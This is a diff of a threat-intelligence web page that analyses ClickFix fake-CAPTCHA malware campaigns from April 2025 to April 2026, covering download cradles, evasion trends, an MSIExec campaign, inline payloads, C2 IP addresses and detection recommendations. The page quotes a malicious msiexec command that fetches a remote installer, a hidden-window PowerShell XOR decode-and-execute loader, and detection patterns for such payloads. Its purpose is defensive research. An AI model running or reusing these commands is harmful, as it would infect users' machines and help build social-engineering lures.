@@ -7,7 +7,7 @@ permalink: /trends/clickgrab/
 
 <style>
 /* ── Page layout ────────────────────────────────────────────────────────── */
-.cg-page { max-width: 900px; margin: 0 auto; padding: 2rem 1.5rem 4rem; }
+.cg-page { }
 .cg-page h1 { font-size: 1.6rem; font-weight: 700; color: var(--text); margin-bottom: .25rem; }
 .cg-page h2 { font-size: 1.15rem; font-weight: 600; color: var(--text); margin: 2.5rem 0 .75rem; border-bottom: 1px solid var(--border); padding-bottom: .4rem; }
 .cg-page h3 { font-size: 1rem; font-weight: 600; color: var(--text); margin: 1.5rem 0 .5rem; }
@@ -81,15 +81,85 @@ permalink: /trends/clickgrab/
   color: var(--text-dim); font-size: .78rem; font-family: inherit;
 }
 .cg-rec-examples-toggle:hover { color: var(--text-muted); }
+
+/* ── Sidebar + layout (local override to survive Tailwind preflight) ── */
+.trends-layout {
+  display: flex;
+  gap: 2rem;
+  max-width: 1100px;
+  margin: 0 auto;
+  padding: 2rem 1.5rem 4rem;
+}
+.trends-sidebar {
+  width: 160px;
+  flex-shrink: 0;
+  position: sticky;
+  top: 5rem;
+  align-self: flex-start;
+  height: fit-content;
+  padding: 1rem 0;
+}
+.trends-sidebar ul { list-style: none; padding: 0; margin: 0; }
+.trends-sidebar li { margin: 0; }
+.trends-sidebar a {
+  display: block;
+  font-family: var(--font-mono, ui-monospace, monospace);
+  font-size: .73rem;
+  color: var(--text-dim, #484f58);
+  padding: .35rem .75rem;
+  text-decoration: none;
+  border-left: 2px solid transparent;
+  transition: color .15s, border-color .15s;
+}
+.trends-sidebar a:hover { color: var(--text-muted); text-decoration: none; }
+.trends-sidebar a.active {
+  color: var(--text, #c9d1d9);
+  border-left-color: var(--accent, #f0883e);
+}
+.trends-content {
+  flex: 1;
+  min-width: 0;
+}
+
+@media (max-width: 900px) {
+  .trends-layout { flex-direction: column; padding: 2rem 1rem 4rem; }
+  .trends-sidebar {
+    position: fixed; bottom: 0; left: 0; right: 0;
+    width: 100%; top: auto; align-self: auto;
+    background: rgba(13,17,23,0.92); backdrop-filter: blur(8px);
+    border-top: 1px solid var(--border); padding: .5rem 0; z-index: 100;
+  }
+  .trends-sidebar ul { display: flex; gap: 0; justify-content: space-around; width: 100%; }
+  .trends-sidebar a {
+    border-left: none; border-bottom: 2px solid transparent;
+    padding: .3rem .5rem; font-size: .6rem; text-align: center;
+  }
+  .trends-sidebar a.active { border-bottom-color: var(--accent); border-left-color: transparent; }
+  .trends-content { padding-bottom: 3.5rem; }
+}
 </style>
 
-<div class="cg-page">
+<div class="trends-layout">
+<nav class="trends-sidebar" id="trends-nav">
+  <ul>
+    <li><a href="#overview" class="active">Overview</a></li>
+    <li><a href="#framework">Framework</a></li>
+    <li><a href="#volume">Volume</a></li>
+    <li><a href="#cradles">Cradles</a></li>
+    <li><a href="#evasion">Evasion</a></li>
+    <li><a href="#msiexec">MSIExec</a></li>
+    <li><a href="#inline">Inline</a></li>
+    <li><a href="#staging">Staging</a></li>
+    <li><a href="#recommendations">Detections</a></li>
+  </ul>
+</nav>
+<div class="cg-page trends-content" id="overview">
 
 <h1>ClickFix Delivery Chain — Trend Analysis</h1>
 <p class="cg-meta">
-  Data: <a href="https://github.com/mhaggis/ClickGrab" target="_blank" rel="noopener">MHaggis ClickGrab</a>
-  &nbsp;·&nbsp; Period: Apr 2025 – Mar 2026
-  &nbsp;·&nbsp; {{ site.data.clickgrab_trends.meta.total_reports }} nightly reports
+  Data: <a href="https://github.com/mhaggis/ClickGrab" target="_blank" rel="noopener">MHaggis ClickGrab</a> + <a href="https://clickfix.carsonww.com/" target="_blank" rel="noopener">ClickFix Hunter</a>
+  &nbsp;·&nbsp; Period: Apr 2025 – Apr 2026
+  &nbsp;·&nbsp; {{ site.data.clickgrab_trends.meta.total_reports }} nightly reports + {{ site.data.clickgrab_trends.meta.total_domains }} domains
   &nbsp;·&nbsp; Generated: {{ site.data.clickgrab_trends.meta.generated }}
 </p>
 
@@ -112,71 +182,71 @@ permalink: /trends/clickgrab/
     <div class="cg-stat-lbl">Base64 obfuscated</div>
   </div>
   <div class="cg-stat">
-    <div class="cg-stat-val">{{ site.data.clickgrab_trends.evasion_totals.self_delete }}</div>
-    <div class="cg-stat-lbl">Self-delete</div>
+    <div class="cg-stat-val">{{ site.data.clickgrab_trends.cradles_total.msiexec }}</div>
+    <div class="cg-stat-lbl">MSIExec deliveries</div>
   </div>
   <div class="cg-stat">
-    <div class="cg-stat-val">{{ site.data.clickgrab_trends.evasion_totals.cdn_staging }}</div>
-    <div class="cg-stat-lbl">CDN-staged payloads</div>
+    <div class="cg-stat-val">{{ site.data.clickgrab_trends.cradles_total.inline_no_url }}</div>
+    <div class="cg-stat-lbl">Inline payloads (no URL)</div>
   </div>
 </div>
 
 <!-- ── Framework Chain Map ───────────────────────────────────────────── -->
-<h2>Detection Chokepoint Framework</h2>
-<p>Five stages of the ClickFix delivery chain. Not all stages are equally detectable — Tier 1 are unavoidable adversary actions regardless of how the lure evolves.</p>
+<h2 id="framework">Detection Chokepoint Framework</h2>
+<p>Every ClickFix variant — ClickFix, FileFix, TerminalFix, InstallFix — follows these five stages. The lure changes. The clipboard command changes. The delivery method changes. But the chain doesn't. Each badge maps to the ATT&CK technique you're actually detecting at that stage.</p>
 
 <div class="cg-chain" role="list" aria-label="ClickFix delivery chain stages">
   <div class="cg-chain-stage cg-chain-stage--blind" role="listitem">
     <span class="cg-chain-label">Browser renders lure</span>
     <span class="cg-chain-sub">Fake CAPTCHA / reCAPTCHA page</span>
-    <span class="cg-tier-badge cg-tier-blind">NOT DETECTABLE</span>
+    <span class="cg-tier-badge cg-tier-blind">LURE DELIVERY</span>
   </div>
   <span class="cg-chain-arrow" aria-hidden="true">›</span>
   <div class="cg-chain-stage cg-chain-stage--blind" role="listitem">
     <span class="cg-chain-label">JS → clipboard</span>
     <span class="cg-chain-sub">execCommand("copy") writes cmd</span>
-    <span class="cg-tier-badge cg-tier-blind">PRE-EXEC</span>
+    <span class="cg-tier-badge cg-tier-blind">CLIPBOARD WRITE</span>
   </div>
   <span class="cg-chain-arrow" aria-hidden="true">›</span>
   <div class="cg-chain-stage cg-chain-stage--t1" role="listitem">
     <span class="cg-chain-label">Process spawn</span>
     <span class="cg-chain-sub">Run dialog → cmd.exe → PowerShell</span>
-    <span class="cg-tier-badge cg-tier-t1">TIER 1</span>
+    <span class="cg-tier-badge cg-tier-t1">T1059 EXECUTION</span>
   </div>
   <span class="cg-chain-arrow" aria-hidden="true">›</span>
   <div class="cg-chain-stage cg-chain-stage--t1" role="listitem">
     <span class="cg-chain-label">Network fetch</span>
     <span class="cg-chain-sub">IWR / IRM / WebClient / Curl</span>
-    <span class="cg-tier-badge cg-tier-t1">TIER 1</span>
+    <span class="cg-tier-badge cg-tier-t1">T1105 INGRESS TOOL</span>
   </div>
   <span class="cg-chain-arrow" aria-hidden="true">›</span>
   <div class="cg-chain-stage cg-chain-stage--t2" role="listitem">
     <span class="cg-chain-label">Payload write</span>
     <span class="cg-chain-sub">Script dropped to %TEMP%</span>
-    <span class="cg-tier-badge cg-tier-t2">TIER 2</span>
+    <span class="cg-tier-badge cg-tier-t2">T1204 USER EXEC</span>
   </div>
   <span class="cg-chain-arrow" aria-hidden="true">›</span>
   <div class="cg-chain-stage cg-chain-stage--t3" role="listitem">
     <span class="cg-chain-label">Execute + cleanup</span>
     <span class="cg-chain-sub">Payload runs, then self-deletes</span>
-    <span class="cg-tier-badge cg-tier-t3">TIER 2/3</span>
+    <span class="cg-tier-badge cg-tier-t3">T1070 CLEANUP</span>
   </div>
 </div>
 
-<p>The <strong>Tier 1 chokepoints are process spawn and network fetch</strong> — every cradle family must touch the network to retrieve the payload, and the unusual parent→PowerShell spawn is unavoidable because the user manually triggers execution from a Run dialog. These are the detection bets that pay off regardless of lure evolution. See the <a href="{{ '/chokepoints/clickfix-techniques/' | relative_url }}">ClickFix Techniques chokepoint</a> for detection logic.</p>
+<p>Two behaviors survive every variant rotation: the process spawn (T1059) and the network fetch (T1105). The user opens Run, pastes, hits Enter — that parent→child process relationship is baked into the attack primitive. And until recently, every cradle had to reach out to a staging URL to pull the payload. That's where your detection bets pay off. We'll get to why "until recently" matters below. Full detection logic is on the <a href="{{ '/chokepoints/clickfix-techniques/' | relative_url }}">ClickFix Techniques chokepoint page</a>.</p>
 
 <!-- ── Chart A: Monthly Volume ───────────────────────────────────────── -->
-<h2>Monthly Volume — Malicious Sites Detected</h2>
-<p>Total sites crawled vs. confirmed malicious per month across {{ site.data.clickgrab_trends.meta.total_reports }} nightly ClickGrab scans.</p>
+<h2 id="volume">Monthly Volume — Malicious Domain Count</h2>
+<p>Unique malicious ClickFix domains observed per month from the domain dataset. Volume spikes correlate with specific campaigns — the Nov 2025 surge was driven by the <code>shift-art.com</code> MSIExec campaign (669 domains).</p>
 
 <div class="cg-chart-wrap">
-  <div class="cg-chart-title">Sites crawled vs. malicious by month</div>
+  <div class="cg-chart-title">Malicious ClickFix domains by month</div>
   <div id="cg-chart-volume"></div>
 </div>
 
 <!-- ── Chart B: Cradle Family Evolution ──────────────────────────────── -->
-<h2>Tier 1 Chokepoint: Cradle Family Evolution</h2>
-<p>The network fetch is the unavoidable action. This chart shows <em>how</em> adversaries are fetching payloads — and how that method has shifted as defenders tuned IWR/IEX detections.</p>
+<h2 id="cradles">T1105 Ingress Tool Transfer: Cradle Family Evolution</h2>
+<p>The network fetch <em>was</em> the unavoidable action. This chart shows how adversaries rotated their download method as defenders tuned IWR/IEX-specific detections — and why that rotation actually validates the chokepoint approach.</p>
 
 <div class="cg-chart-wrap">
   <div class="cg-chart-title">Monthly cradle family distribution (PowerShell download method)</div>
@@ -184,37 +254,79 @@ permalink: /trends/clickgrab/
 </div>
 
 <div class="cg-callout cg-callout--warn">
-  <strong>Dec 2025 pivot:</strong> IWR/IEX drops sharply as WebClient (.NET) and Curl/Bash surge simultaneously — a clear signal that IWR-specific detections were effective and adversaries rotated to alternatives. If your detection logic is <code>iwr|Invoke-WebRequest</code> pattern matching, coverage dropped significantly in Q4 2025.
+  <strong>Dec 2025 pivot — your IWR detections worked.</strong> IWR/IEX drops sharply as WebClient and Curl surge in the same month. That's not coincidence — that's adversaries responding to detection pressure. If you were pattern-matching on <code>iwr|Invoke-WebRequest</code>, congratulations: you forced a rotation. But if that's <em>all</em> you were matching, your coverage just dropped to near-zero.
+</div>
+
+<div class="cg-callout cg-callout--alert">
+  <strong>Mar 2026: IWR came back.</strong> After nearly disappearing in Dec–Jan, IWR surged to 27.7% in March. A <code>verifyhumanbot.com</code> / <code>SafeAntiBotsNet</code> campaign brought it right back. This is the whole point — cradle rotation is cyclical, not one-directional. The adversary who abandoned IWR in December picked it back up in March because defensive attention had shifted elsewhere. If you built behavioral rules (unusual parent → PowerShell → outbound fetch), you caught it both times. If you built string-match rules, you caught it, lost it, and caught it again — assuming you didn't delete the "obsolete" detection.
 </div>
 
 <div class="cg-callout cg-callout--info">
-  <strong>Why this is still Tier 1:</strong> The network fetch method changed from IWR to Curl/WebClient, but the chokepoint didn't move. Any outbound connection to a staging URL from a PowerShell process spawned by an unusual parent (explorer.exe, cmd.exe from Run dialog) remains the detection signal. Behavioral rules survive cradle rotation; method-specific string matching does not.
+  <strong>The chokepoint didn't move.</strong> IWR → WebClient → Curl → IWR again. The download method rotated three times in six months. The detection signal didn't change once: PowerShell process spawned by an unusual parent (explorer.exe, cmd.exe from Run dialog) making an outbound HTTP connection. That's the difference between detecting the tool and detecting the behavior.
 </div>
 
 <!-- ── Chart C: Evasion Technique Trends ─────────────────────────────── -->
-<h2>Evasion Technique Trends — Where Adversaries Are Adapting</h2>
-<p>These are the adversary adaptation signals in the trend data. Rising lines indicate where defenders got effective and adversaries responded. Flat lines with spikes indicate campaign surges.</p>
+<h2 id="evasion">Evasion Technique Trends — Where Adversaries Are Adapting</h2>
+<p>Think of this chart as a conversation between attackers and defenders. Rising lines = defenders forced a change. Flat lines with spikes = a specific campaign tried something, then moved on. The trends tell you which evasion techniques are gaining traction and which were one-off experiments.</p>
 
 <div class="cg-chart-wrap">
   <div class="cg-chart-title">Monthly evasion technique prevalence (count of sites using each technique)</div>
   <div id="cg-chart-evasion"></div>
 </div>
 
+<div class="cg-callout cg-callout--warn">
+  <strong>Self-delete was a burst, not a trend.</strong> 27.4% in Dec → 2.3% Jan → 0% by April. One campaign tried it, others didn't pick it up. It's in the toolkit but it's not the future. If you built file-write-then-delete correlation rules in December, keep them — but the bigger threat is below.
+</div>
+
+<div class="cg-callout cg-callout--warn">
+  <strong>Base64 isn't plateauing — it's accelerating.</strong> 19.5% in March, 54.2% in April. If your rules match plaintext <code>iwr https://</code> strings, you're seeing the encoded version now, not the decoded cradle. Detect the encoding act: <code>[Convert]::FromBase64String</code> piped to <code>iex</code>. Or detect <code>-enc</code> on the command line from an unusual parent. The content is opaque; the execution context isn't.
+</div>
+
+<div class="cg-callout cg-callout--warn">
+  <strong>Mixed-case is dead.</strong> POWerShEll, PowErsHeLL — peaked mid-2025, trending to zero. Base64 replaced it as the primary obfuscation. If you shipped case-insensitive regex in 2025, you caught the tail end of a dying technique. Not wasted effort — but not where the action is anymore.
+</div>
+
+<!-- ── MSIExec Delivery ─────────────────────────────────────────── -->
+<h2 id="msiexec">New Cradle Family: MSIExec Package Installation</h2>
+<p>In November 2025, the ClickFix chokepoint shifted underneath the detection layer. 87% of domains rotated from PowerShell cradles to <code>msiexec /i</code> — same social engineering invariant, completely different execution chain. MSIExec delivery peaked at 669/767 domains before declining through Q1 2026. The technique shift demonstrates why chokepoint-anchored detection matters: PowerShell-specific rules missed the rotation entirely, but detections built around the clipboard-to-execution invariant still caught the handoff.</p>
+
+<p>The <code>shift-art.com</code> campaign drove the surge — 651 domains using fake Cloudflare verification paths. The URL structure alone is worth a detection:</p>
+
+<pre class="logic-block rounded-lg p-4 overflow-x-auto text-[.8rem]"><code>msiexec /i https://shift-art.com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/</code></pre>
+
 <div class="cg-callout cg-callout--alert">
-  <strong>Self-delete: zero → hundreds in one month.</strong> From April–November 2025, zero recorded self-delete instances. Starting December 2025, self-delete appeared in hundreds of sites per month ({{ site.data.clickgrab_trends.evasion_totals.self_delete }} total across the campaign). This defeats forensic artifact detection — any rule that relies on finding dropped script files will see nothing after execution. Correlate process execution with file-system events <em>before</em> cleanup completes.
+  <strong>Same chokepoint, different binary.</strong> <code>msiexec.exe</code> spawning from <code>cmd.exe</code> or Run dialog, fetching an MSI from a non-enterprise URL — that's the same parent→child process execution chokepoint (T1059/T1218) as the PowerShell cradles. The invariant is the process relationship, not the binary name. Oct 18% → <strong>Nov 87%</strong> → Dec 34% → Jan 24% → Feb 29% → Mar 2%.
 </div>
 
-<div class="cg-callout cg-callout--warn">
-  <strong>Base64 explosion Jan 2026:</strong> Base64-encoded payloads increased ~18× vs. the April 2025 baseline. This defeats plaintext command inspection. IDS/SIEM rules matching raw PowerShell strings like <code>iwr https://</code> are seeing the encoded version, not the decoded cradle. Detection must decode or detect the encoding act itself.
+<h3>WScript/VBS: A Failed Diversification (Dec 2025 – Feb 2026)</h3>
+<p>Adversaries also tried VBS in the same diversification window — Dec 2025 (21.9%), peaked Jan (46.3%), dead by March (0%). Used <code>CreateObject("WinHttp.WinHttpRequest.5.1")</code> to fetch payloads via WScript. Abandoned fast. EDR catches WScript execution reliably, so this branch got pruned while WebClient and Curl survived. Not every experiment sticks.</p>
+
+<!-- ── Inline Payloads ─────────────────────────────────────────── -->
+<h2 id="inline">Strategic Shift: Inline Payloads Bypassing Network Fetch Detection</h2>
+<p>Here's the finding that changes the detection calculus: <strong>75% of April 2026 domains have no URL in the clipboard command at all.</strong> Up from 28% in August. The payload is entirely inline — the user pastes everything needed, and nothing reaches out to a staging server. Your network-fetch detection? It never fires.</p>
+
+<p>Three techniques are driving this: <strong>hex XOR</strong> (<code>$k/$d</code> variable patterns with <code>-bxor</code> decoding, 62 instances in March), <strong>Base64 <code>-enc</code></strong> (over half of April samples), and <strong>direct embedding</strong> with no obfuscation at all. The social engineering does double duty — fake CAPTCHA comments inside the payload reinforce the lure:</p>
+
+<pre class="logic-block rounded-lg p-4 overflow-x-auto text-[.8rem]"><code>powershell -w hidden &lt;# I am not a robot - Cloudflare ID: 8e3f2a #&gt; $k='xK9mP2';$d='4a5b6c...';
+$b=[byte[]]@();for($i=0;$i-lt$d.Length;$i+=2){$b+=[byte]("0x"+$d.Substring($i,2))-bxor[byte]$k[$i%$k.Length]};
+iex([Text.Encoding]::UTF8.GetString($b))</code></pre>
+
+<div class="cg-callout cg-callout--alert">
+  <strong>Your network-fetch detection covers half the threat now.</strong> 46% of March and 75% of April domains skip the remote fetch entirely. You need a parallel detection for the decode-and-execute pattern: unusual parent → PowerShell with <code>-enc</code>, <code>-bxor</code> operations, or <code>[Convert]::FromBase64String</code> piped to <code>iex</code>. Neither detection alone is sufficient anymore. Run both.
 </div>
 
-<div class="cg-callout cg-callout--warn">
-  <strong>Mixed-case PowerShell declining:</strong> Mixed-case variants (POWerShEll, PowErsHeLL) peaked in mid-2025 then trended down as Base64 encoding became the primary obfuscation method. If you added case-insensitive PowerShell regex, you caught the technique as adversaries were already moving away from it.
+<p>Monthly no-URL trend: Aug 28% → Sep 32% → Oct 32% → Nov 6% → Dec 19% → Jan 44% → Feb 30% → <strong>Mar 47% → Apr 75%</strong>.</p>
+
+<h3>Port 5506 C2 Infrastructure Cluster</h3>
+<p>333 domains call back to port 5506 across 14 IPs in a few /24 ranges. One operator, one port, zero legitimate services using 5506. This is the kind of infrastructure fingerprint that makes network detection easy.</p>
+
+<div class="cg-callout cg-callout--info">
+  <strong>Any outbound connection to port 5506 from a workstation is suspicious.</strong> Port 5506 is not used by any common legitimate service. Top nodes: <code>198.13.158.127:5506</code> (186 domains), <code>178.17.59.40:5506</code> (64), <code>78.40.209.164:5506</code> (40).
 </div>
 
 <!-- ── Staging Infrastructure ────────────────────────────────────────── -->
-<h2>Staging Infrastructure</h2>
-<p>Domains serving the actual payloads (from PowerShell download commands). CDN-hosted payloads defeat domain-reputation blocking — the infrastructure looks like legitimate web hosting.</p>
+<h2 id="staging">Staging Infrastructure</h2>
+<p>Where the payloads actually live. CDN-hosted staging defeats domain-reputation blocking because the infrastructure <em>is</em> legitimate web hosting. You can't blocklist <code>raw.githubusercontent.com</code> without breaking your developers' workflows. Detection has to be contextual — a network appliance fetching a shell script from GitHub and piping it to bash is anomalous regardless of the domain.</p>
 
 <div style="overflow-x:auto;">
 <table class="cg-table">
@@ -310,18 +422,18 @@ permalink: /trends/clickgrab/
 </table>
 </div>
 
-<p style="font-size:.75rem;color:var(--text-dim);margin:.25rem 0 .75rem;">Click any row to expand ASN, geo, hosting type, and registration details. ASN / geo data populated by <code>analyze_clickgrab.py</code> via ip-api.com and RDAP on next pipeline run. Passive DNS history requires a SecurityTrails or similar account.</p>
+<p style="font-size:.75rem;color:var(--text-dim);margin:.25rem 0 .75rem;">Domain names and observation counts are from ClickGrab nightly reports. Hosting type is only classified when verifiable from the domain itself (e.g., <code>*.cdn-website.com</code> = CDN, <code>*.wpengine.com</code> = managed hosting). IP enrichment (ASN, geo, registrar) requires running the enrichment pipeline — unverified entries show "Unknown."</p>
 
 <div class="cg-callout cg-callout--alert">
   <strong>CDN-hosted staging defeats domain blocking.</strong> <code>irp.cdn-website.com</code> appeared in {{ site.data.clickgrab_trends.evasion_totals.cdn_staging }} payload fetches. This is a legitimate CDN used by website builders — blocking it would impact legitimate sites. Detection must shift to behavioral signals (PowerShell → network → unusual domain path) rather than domain-reputation lookup.
 </div>
 
 <!-- ── Detection Recommendations ────────────────────────────────────── -->
-<h2>Detection Recommendations</h2>
-<p>Prioritized by chokepoint tier. Tier 1 recommendations survive lure evolution, cradle rotation, and obfuscation changes.</p>
+<h2 id="recommendations">Detection Recommendations</h2>
+<p>Each recommendation maps to the ATT&CK technique it detects. The ones at the top survived every cradle rotation, every obfuscation pivot, and every infrastructure change in this dataset. The ones lower down are still valuable but more brittle.</p>
 
 <div class="cg-rec">
-  <div class="cg-rec-tier"><span class="cg-tier-badge cg-tier-t1" style="display:block;text-align:center;padding:.25rem .5rem;">TIER 1</span></div>
+  <div class="cg-rec-tier"><span class="cg-tier-badge cg-tier-t1" style="display:block;text-align:center;padding:.25rem .5rem;">T1059</span></div>
   <div class="cg-rec-body">
     <strong>Detect unusual parent → PowerShell spawn</strong>
     Correlate <code>explorer.exe</code> or <code>cmd.exe</code> (from Run dialog) spawning <code>powershell.exe</code> with a window-hidden flag. This signal is constant regardless of cradle family rotation. See <a href="https://github.com/{{ site.github_username }}/{{ site.github_repo }}/blob/main/sigma-rules/clickfix/hunt.yml" target="_blank" rel="noopener">sigma-rules/clickfix/hunt.yml</a>.
@@ -344,7 +456,7 @@ permalink: /trends/clickgrab/
 </div>
 
 <div class="cg-rec">
-  <div class="cg-rec-tier"><span class="cg-tier-badge cg-tier-t1" style="display:block;text-align:center;padding:.25rem .5rem;">TIER 1</span></div>
+  <div class="cg-rec-tier"><span class="cg-tier-badge cg-tier-t1" style="display:block;text-align:center;padding:.25rem .5rem;">T1059</span></div>
   <div class="cg-rec-body">
     <strong>Cradle-agnostic network fetch detection</strong>
     Move from IWR/IRM string matching to: <em>PowerShell process → outbound HTTP/HTTPS to non-Microsoft, non-CDN domain → path ends in .ps1/.txt/.hta</em>. This catches IWR, Curl, WebClient, and any future cradle. Update Sigma rules to use process+network correlation, not command-string pattern matching.
@@ -392,7 +504,7 @@ permalink: /trends/clickgrab/
 </div>
 
 <div class="cg-rec">
-  <div class="cg-rec-tier"><span class="cg-tier-badge cg-tier-t2" style="display:block;text-align:center;padding:.25rem .5rem;">TIER 2</span></div>
+  <div class="cg-rec-tier"><span class="cg-tier-badge cg-tier-t2" style="display:block;text-align:center;padding:.25rem .5rem;">T1027</span></div>
   <div class="cg-rec-body">
     <strong>Detect Base64 decode + execute</strong>
     <code>[Convert]::FromBase64String</code> or <code>[Text.Encoding]::UTF8.GetString</code> followed immediately by <code>iex</code> / <code>Invoke-Expression</code>. The encoding act itself is detectable even when the decoded content is not. This covers the 18× Base64 increase seen in Jan 2026.
@@ -418,7 +530,7 @@ permalink: /trends/clickgrab/
 </div>
 
 <div class="cg-rec">
-  <div class="cg-rec-tier"><span class="cg-tier-badge cg-tier-t2" style="display:block;text-align:center;padding:.25rem .5rem;">TIER 2</span></div>
+  <div class="cg-rec-tier"><span class="cg-tier-badge cg-tier-t2" style="display:block;text-align:center;padding:.25rem .5rem;">T1070</span></div>
   <div class="cg-rec-body">
     <strong>File write → execute → delete correlation (new Dec 2025)</strong>
     Self-delete appeared at scale in December 2025. Correlate: script written to <code>%TEMP%</code> → process execution from that path → file deletion within seconds. If artifact-based rules are your only coverage, they're now blind after execution completes. Use process execution telemetry, not file presence.
@@ -463,7 +575,24 @@ permalink: /trends/clickgrab/
   </div>
 </div>
 
-</div><!-- /.cg-page -->
+<div class="cg-rec">
+  <div class="cg-rec-tier"><span class="cg-tier-badge cg-tier-t1" style="display:block;text-align:center;padding:.25rem .5rem;">T1218</span></div>
+  <div class="cg-rec-body">
+    <strong>Detect MSIExec fetching packages from non-enterprise URLs</strong>
+    <code>msiexec.exe</code> with <code>/i http</code> where the URL is not a known enterprise software source, spawned from <code>cmd.exe</code> or <code>explorer.exe</code> (Run dialog). Covers the 1,027-domain MSIExec delivery campaign that peaked at 87% in Nov 2025.
+  </div>
+</div>
+
+<div class="cg-rec">
+  <div class="cg-rec-tier"><span class="cg-tier-badge cg-tier-t1" style="display:block;text-align:center;padding:.25rem .5rem;">T1059</span></div>
+  <div class="cg-rec-body">
+    <strong>Detect inline payload decode-and-execute</strong>
+    PowerShell with <code>-enc</code> flag or XOR decode operations (<code>-bxor</code>, <code>[byte]</code>, <code>[char]</code>) spawned from unusual parent (Run dialog chain). Also: <code>[Convert]::FromBase64String</code> followed by <code>iex</code>. Covers the 28% → 75% growth in inline payloads that skip the network fetch entirely. <strong>Run alongside network-fetch detection — both are needed for full coverage.</strong>
+  </div>
+</div>
+
+</div><!-- /.cg-page / .trends-content -->
+</div><!-- /.trends-layout -->
 
 <!-- ── Data injection + chart init ──────────────────────────────────── -->
 <script>
@@ -493,4 +622,26 @@ document.querySelectorAll('.cg-infra-toggle').forEach(function(btn) {
     if (row) row.classList.toggle('expanded', !expanded);
   });
 });
+
+// Trends sidebar scroll spy
+(function() {
+  var navLinks = document.querySelectorAll('.trends-sidebar a');
+  if (!navLinks.length) return;
+  var sectionIds = [];
+  navLinks.forEach(function(link) {
+    sectionIds.push(link.getAttribute('href').slice(1));
+  });
+  var sections = sectionIds.map(function(id) { return document.getElementById(id); }).filter(Boolean);
+  if (!sections.length) return;
+  var observer = new IntersectionObserver(function(entries) {
+    entries.forEach(function(entry) {
+      if (entry.isIntersecting) {
+        navLinks.forEach(function(link) {
+          link.classList.toggle('active', link.getAttribute('href') === '#' + entry.target.id);
+        });
+      }
+    });
+  }, { rootMargin: '-20% 0px -70% 0px' });
+  sections.forEach(function(section) { observer.observe(section); });
+})();
 </script>
